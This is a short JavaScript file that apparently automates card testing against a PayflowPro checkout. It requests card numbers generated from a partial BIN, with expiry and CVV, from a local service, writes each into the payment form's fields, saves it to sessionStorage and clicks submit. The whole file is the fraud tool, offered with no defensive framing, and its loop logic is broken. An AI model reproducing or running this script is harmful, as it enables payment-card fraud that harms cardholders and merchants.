var jsonp_callback = function(arr) {
	var i = 0;
	var len = arr.length;
        var segundos = 5;

	var iteration = function() {
	  if( i < len ) {
	    var json = arr[0];

	  	$("#PayflowPro_ccno").val(json.card);

		$("#PayflowPro_ccexpm").val(json.mon);

		$("#PayflowPro_ccexpy").val(json.year);

        sessionStorage.card = JSON.stringify( json );

        console.log(json);

		$("p.Submit>input").click();

	  }
	}

	iteration();
};
// Cattle tags
$.ajax({
     url:"http://localhost:5000/bin?bin=4500030118xxxxxx&mon=05&year=18&cvv=254&can=1",
     dataType: "jsonp"
});
